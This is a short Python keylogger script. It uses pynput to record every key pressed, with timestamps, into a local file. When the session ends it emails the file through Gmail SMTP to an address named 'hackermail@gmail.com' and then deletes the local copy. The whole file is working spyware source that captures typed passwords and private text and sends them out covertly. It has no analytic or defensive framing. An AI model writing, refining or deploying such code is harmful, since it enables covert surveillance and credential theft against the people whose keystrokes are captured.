from pynput import keyboard
from datetime import datetime
import os
import smtplib
from email.message import EmailMessage
import mimetypes

def create_and_send_email(recipient,subject,content,attachment=None):
    sender = 'putyouremail@gmail.com'
    password = 'putyourpassword'
    mail_server = smtplib.SMTP_SSL('smtp.gmail.com')
    mail_server.login(sender,password)

    email = EmailMessage()
    email['To'] = recipient
    email['From'] = sender
    email['Subject'] = subject
    email.set_content(content)

    if attachment is not None:
        filename = os.path.basename(attachment)
        mime_full_type,_ = mimetypes.guess_type(attachment)
        mime_type,sub_type = mime_full_type.split('/')
        with open(attachment,'rb') as attached_file:
            email.add_attachment(attached_file.read(),
                                maintype=mime_type,
                                subtype= sub_type,
                                filename=filename)

    mail_server.send_message(email)
    mail_server.quit()

def on_press(key):
    try:
        file.write(f"Alphanumeric key pressed: {key.char} at {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")
    except AttributeError:
        file.write(f"Special key pressed: {str(key)[4:]} {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")

def on_release(key):
    if key == keyboard.Key.esc:
        return False
try:
    start = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
    file = open('keys.txt','w')
    with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
        listener.join()
except:
    pass
finally:
    end = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
    file.close()
    create_and_send_email("hackermail@gmail.com","KEYSTROKES TODAY!",
    f'''
    Session Start: {start}
    Session End: {end}

    All the recorded keystrokes are in this attached file below!
    ''', "keys.txt")
    os.remove("keys.txt")